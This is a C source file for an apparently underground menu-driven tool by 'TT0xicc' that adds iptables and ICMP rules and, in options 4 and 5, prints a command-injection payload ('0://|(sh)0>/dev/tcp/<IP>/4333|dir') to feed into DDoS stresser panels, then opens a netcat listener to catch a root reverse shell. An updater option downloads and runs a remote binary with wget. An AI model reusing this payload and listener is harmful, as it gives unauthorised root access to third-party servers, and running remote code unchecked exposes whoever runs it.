// Goofy ahhh script made by TT0xicc
// Just compile dis shit & run
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>

int mainmenu(){

  char choose;
  system("clear");
  printf("\n");
  printf("[\e[0;94mi\e[0m] Added a bunch useful functions\n");
  printf("Version: \e[0;95m♦\e[0m 1\e[0;93m.\e[0m1\e[0;93m.\e[0m0 \e[0;95m♦\e[0m\n");
  printf("\e[0;95m►\e[0m Made by TT0xicc(.sbs) \e[0;95m◄\e[0m\n");
  printf("\n");
  printf("[1] Block ICMP\n");
  printf("[2] Block Check-host.net\n");
  printf("[3] Open Web Ports\n");
  printf("[4] Reverse Shell For C2's And Webstressers (L7)\n");
  printf("[5] Reverse Shell Example (Tutorial)\n");
  printf("[6] Check For Newer Version Of This Script (Updater)\n");
  printf("[0] Exit\n");
}

int options(){

  int option;

  printf("\nChoose a number#~ ");
  scanf("%d", &option);

if(option == 1){
            printf("\n");
            printf("\n[\e[0;96m!\e[0m] Enable ICMP block.");
            sleep(1);
            system("clear");
            printf("\n[\e[0;96m!\e[0m] Enable ICMP block..");
            sleep(1);
            system("clear");
            printf("\n[\e[0;96m!\e[0m] Enable ICMP block...");
            sleep(1);
            system("clear");
            system("sysctl -w net.ipv4.icmp_echo_ignore_all=1\n");
            system("clear");
            printf("\n[\e[0;92m+\e[0m] Enabled!");
            printf("\n");
            sleep(8);
            system("clear");
    }
    else if(option == 2){
            printf("[\e[0;96m!\e[0m] Applying Check-Host Ping Blocklist");
            sleep(2);
            system("clear");
            system("iptables -I INPUT -s 87.251.79.82 -j DROP");
            system("iptables -I INPUT -s 93.123.16.89 -j DROP");
            system("iptables -I INPUT -s 77.75.230.51 -j DROP");
            system("iptables -I INPUT -s 95.216.93.66 -j DROP");
            system("iptables -I INPUT -s 147.135.231.100 -j DROP");
            system("iptables -I INPUT -s 185.37.147.117 -j DROP");
            system("iptables -I INPUT -s 167.235.135.184 -j DROP");
            system("iptables -I INPUT -s 185.105.238.209 -j DROP");
            system("iptables -I INPUT -s 185.105.236.209 -j DROP");
            system("iptables -I INPUT -s 181.214.197.192 -j DROP");
            system("iptables -I INPUT -s 185.25.204.60 -j DROP");
            system("iptables -I INPUT -s 185.120.77.165 -j DROP");
            system("iptables -I INPUT -s 88.119.179.10 -j DROP");
            system("iptables -I INPUT -s 178.17.171.235 -j DROP");
            system("iptables -I INPUT -s 185.209.161.169 -j DROP");
            system("iptables -I INPUT -s 188.68.231.19 -j DROP");
            system("iptables -I INPUT -s 185.83.213.25 -j DROP");
            system("iptables -I INPUT -s 185.130.104.238 -j DROP");
            system("iptables -I INPUT -s 194.26.229.20 -j DROP");
            system("iptables -I INPUT -s 194.146.57.64 -j DROP");
            system("iptables -I INPUT -s 179.43.148.195 -j DROP");
            system("iptables -I INPUT -s 185.169.54.231 -j DROP");
            system("iptables -I INPUT -s 185.86.77.126 -j DROP");
            system("iptables -I INPUT -s 91.231.182.39 -j DROP");
            system("iptables -I INPUT -s 185.143.223.66 -j DROP");
            system("iptables -I INPUT -s 5.253.30.82 -j DROP");
            system("iptables -I INPUT -s 78.153.130.65 -j DROP");
            printf("\n[\e[0;92m+\e[0m] Applied!\n");
            sleep(3);
        }
        else if(option == 3){
            system("clear");
            printf("Adding rules\n");
            sleep(1);
            system("clear");
            printf("Adding rules.\n");
            sleep(1);
            system("clear");
            printf("Adding rules..\n");
            sleep(1);
            system("clear");
            printf("Adding rules...\n");
            system("clear");
            system("iptables -I INPUT -p tcp --dport 80 -j ACCEPT");
            system("iptables -I INPUT -p tcp --dport 443 -j ACCEPT");
            printf("[\e[0;92m+\e[0m] Sucessfully opened\n");
            sleep(3);
        }
        else if(option == 4){
            int n;
            struct ifreq ifr;
            char array[] = "eth0";
            n = socket(AF_INET, SOCK_DGRAM, 0);
            ifr.ifr_addr.sa_family = AF_INET;
            strncpy(ifr.ifr_name , array , IFNAMSIZ - 1);
            ioctl(n, SIOCGIFADDR, &ifr);
            close(n);
            system("clear");
            system("iptables -I INPUT -p tcp --dport 4333 -j ACCEPT");
            printf("[\e[0;91m!\e[0m] Insert your payload on a Layer7 method as Target (\e[0;97m.https 0://|(sh)0>/dev/tcp/%s/4333|dir 30 80\e[0m)\n", inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
            printf("[\e[0;94mi\e[0m] This method is already \e[4;31mfixed on most stressers\e[0m but sometimes you're lucky\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] After an \e[4;32msuccessful\e[0m hit paste: \e[0;97mexec >&0\e[0m\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] Your Payload is: \e[0;97m\n0://|(sh)0>/dev/tcp/%s/4333|dir\e[0m\n", inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr) );
            printf("\n");
            system("nc -nklvvp 4333\n");
        }   
        else if(option == 5){
            system("clear");
            printf("[\e[0;91m!\e[0m] Insert your payload on a Layer7 method as Target (\e[0;97m.https 0://|(sh)0>/dev/tcp/YOURIP/4333|dir 30 80\e[0m)\n");
            printf("[\e[0;94mi\e[0m] This method is already \e[4;31mfixed on most stressers\e[0m but sometimes you're lucky\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] After an \e[4;32msuccessful\e[0m hit paste: \e[0;97mexec >&0\e[0m\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] Your Payload is: \e[0;97m\n0://|(sh)0>/dev/tcp/YOURIP/4333|dir\e[0m\n");
            printf("\n");
            printf("listening on [any] 4333 ...\n");
            printf("After an successful infection:\n");
            sleep(3);
            printf("\nconnect to [YOURIP] from (UNKNOWN) [TARGETIP] 50810\n");
            system("clear");
            printf("[\e[0;91m!\e[0m] Insert your payload on a Layer7 method as Target (\e[0;97m.https 0://|(sh)0>/dev/tcp/YOURIP/4333|dir 30 80\e[0m)\n");
            printf("[\e[0;94mi\e[0m] This method is already \e[4;31mfixed on most stressers\e[0m but sometimes you're lucky\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] After an \e[4;32msuccessful\e[0m hit paste: \e[0;97mexec >&0\e[0m\n");
            printf("\n");
            printf("[\e[0;93m>\e[0m] Your Payload is: \e[0;97m\n0://|(sh)0>/dev/tcp/YOURIP/4333|dir\e[0m\n");
            printf("\n");
            printf("listening on [any] 4333 ...\n");
            printf("\n");
            printf("\nconnect to [YOURIP] from (UNKNOWN) [TARGETIP] 50810\n");
            printf("exec >&0  //you will have to enter this by hand or you wont be able to access the server correctly\n");
            sleep(3);
            printf("whoami\n");
            sleep(1);
            printf("root\n");
            sleep(1);
            printf("\n");
            printf("\n");
            printf("You've done the tutorial. I hope u kinda understand this shit.\n");
        }   
        else if(option == 6){
            system("clear");
            system("rm -rf multi");
            system("wget https://example.com/multi");
            system("chmod +x multi");
            printf("\n[\e[0;95m-\e[0m] Done. Restarting script\n");
            sleep(3);
            system("./multi");
        }
        else if(option == 0){
            printf("[\e[0;91m-\e[0m] Operation canceled!\n");
        }
        else{
            printf("[\e[0;91m404\e[0m] Option not found\n");
        }
}

int main(){

// call important functions
    mainmenu();
    options();

return 0;
}